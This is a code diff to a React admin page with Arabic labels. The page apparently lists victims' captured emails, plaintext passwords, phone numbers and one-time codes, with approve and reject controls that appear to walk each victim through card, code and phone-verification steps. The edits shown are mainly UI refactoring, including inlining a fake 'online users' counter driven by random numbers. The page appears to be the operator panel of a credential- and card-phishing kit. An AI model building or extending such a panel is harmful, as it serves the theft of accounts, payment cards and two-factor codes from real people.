@@ -11,7 +11,6 @@ import {
   Bell,
   LogOut,
   CheckCircle,
-  XCircle,
   Clock,
   MapPin,
   Search,
@@ -27,10 +26,6 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
-  Phone,
-  LockIcon,
-  Shield,
-  ClipboardCheck,
   Zap,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
@@ -101,27 +96,6 @@ interface Notification {
   password?: string
   email?: string
   otp?: string
-}
-
-const stepButtons = [
-  { name: "بطاقه", label: <CreditCard />, step: 1 },
-  { name: "كود", label: <LockIcon />, step: 2 },
-  { name: "رقم", label: <Phone />, step: 3 },
-  { name: "كود هاتف", label: <Shield />, step: 4 },
-  { name: "مصادقة", label: <ClipboardCheck />, step: 5 },
-]
-
-function useOnlineUsersCount(): number {
-  const [count, setCount] = useState(0)
-
-  useEffect(() => {
-    const interval = setInterval(() => {
-      setCount(Math.floor(Math.random() * 100))
-    }, 30000)
-    return () => clearInterval(interval)
-  }, [])
-
-  return count
 }
 
 function StatisticsCard({
@@ -658,9 +632,16 @@ export default function NotificationsPage() {
   const [showStatstics, setShowStatstics] = useState(true)
 
   const router = useRouter()
-  const onlineUsersCount = useOnlineUsersCount()
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
 
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setOnlineUsersCount(Math.floor(Math.random() * 100))
+    }, 30000)
+    return () => clearInterval(interval)
+  }, [])
 
   useEffect(() => {
     const statusRefs: { [key: string]: () => void } = {}
@@ -1228,16 +1209,20 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={notification.password ? "default" : "secondary"}
-                            className={notification.password?"bg-sky-600 text-xs cursor-pointer":"text-xs cursor-pointer"}
+                            className={
+                              notification.password ? "bg-sky-600 text-xs cursor-pointer" : "text-xs cursor-pointer"
+                            }
                             onClick={() => handleInfoClick(notification, "personal")}
                           >
                             {notification.password ? "شخصي" : "لا يوجد"}
                           </Badge>
                           <Badge
-                            variant={notification.otp ? "default" : "secondary"}
-                            className={notification.password?"bg-pink-400 text-xs cursor-pointer":"text-xs cursor-pointer"}
+                            variant={notification.phone ? "default" : "secondary"}
+                            className={
+                              notification.phone ? "bg-pink-400 text-xs cursor-pointer" : "text-xs cursor-pointer"
+                            }
                           >
-                            {notification.otp ? notification.otp : "—"}
+                            {notification.phone ? notification.phone : "—"}
                           </Badge>
                         </div>
                       </td>
@@ -1270,29 +1255,12 @@ export default function NotificationsPage() {
                         <UserStatus userId={notification.id} />
                       </td>
                       <td className="px-6 py-4">
-                        <div className="flex justify-center gap-1">
-                          <Button
-                            variant="ghost"
-                            size="sm"
-                            onClick={() => handleApproval("approved", notification.id)}
-                            className="h-8 w-8 p-0 text-emerald-600 hover:bg-emerald-50 dark:hover:bg-emerald-900/20"
-                            disabled={notification.status === "approved"}
-                            title="موافقة"
-                          >
-                            <CheckCircle className="h-4 w-4" />
-                          </Button>
-
-                          <Button
-                            variant="ghost"
-                            size="sm"
-                            onClick={() => handleApproval("rejected", notification.id)}
-                            className="h-8 w-8 p-0 text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20"
-                            disabled={notification.status === "rejected"}
-                            title="رفض"
-                          >
-                            <XCircle className="h-4 w-4" />
-                          </Button>
-
+                        <div className="flex justify-center gap-2">
+                          {notification.otp && (
+                            <Badge variant="outline" className="text-xs">
+                              {notification.otp}
+                            </Badge>
+                          )}
                           <Button
                             variant="ghost"
                             size="sm"
@@ -1302,12 +1270,6 @@ export default function NotificationsPage() {
                           >
                             <Trash2 className="h-4 w-4" />
                           </Button>
-
-                          <FlagColorSelector
-                            notificationId={notification.id}
-                            currentColor={notification?.flagColor}
-                            onColorChange={handleFlagColorChange}
-                          />
                         </div>
                       </td>
                     </tr>
@@ -1348,9 +1310,14 @@ export default function NotificationsPage() {
                       >
                         {notification.password ? "شخصي" : "لا يوجد"}
                       </Badge>
-                      <Badge variant={notification.otp ? "default" : "secondary"} className="text-xs">
-                        {notification.otp ? notification.otp : "—"}
+                      <Badge variant={notification.phone ? "default" : "secondary"} className="text-xs">
+                        {notification.phone ? notification.phone : "—"}
                       </Badge>
+                      {notification.otp && (
+                        <Badge variant="outline" className="text-xs">
+                          {notification.otp}
+                        </Badge>
+                      )}
                     </div>
 
                     <div className="flex items-center justify-between pt-2 border-t border-border/50">
@@ -1380,17 +1347,17 @@ export default function NotificationsPage() {
                         موافقة
                       </Button>
                       <Button
-                        variant="outline"
                         onClick={() => handleApproval("rejected", notification.id)}
-                        className="flex-1 h-8 text-xs text-red-600"
+                        variant="destructive"
+                        className="flex-1 h-8 text-xs"
                         size="sm"
                         disabled={notification.status === "rejected"}
                       >
                         رفض
                       </Button>
                       <Button
-                        variant="ghost"
                         onClick={() => handleDelete(notification.id)}
+                        variant="ghost"
                         className="h-8 w-8 p-0 text-red-600"
                         size="sm"
                       >
@@ -1451,7 +1418,7 @@ export default function NotificationsPage() {
                 {[
                   { label: "ايميل", value: selectedNotification.email },
                   { label: "رمز السري", value: selectedNotification.password },
-                  { label: "كود", value: selectedNotification.otp },
+                  { label: "كود", value: selectedNotification.phone },
                 ].map(
                   ({ label, value }) =>
                     value && (
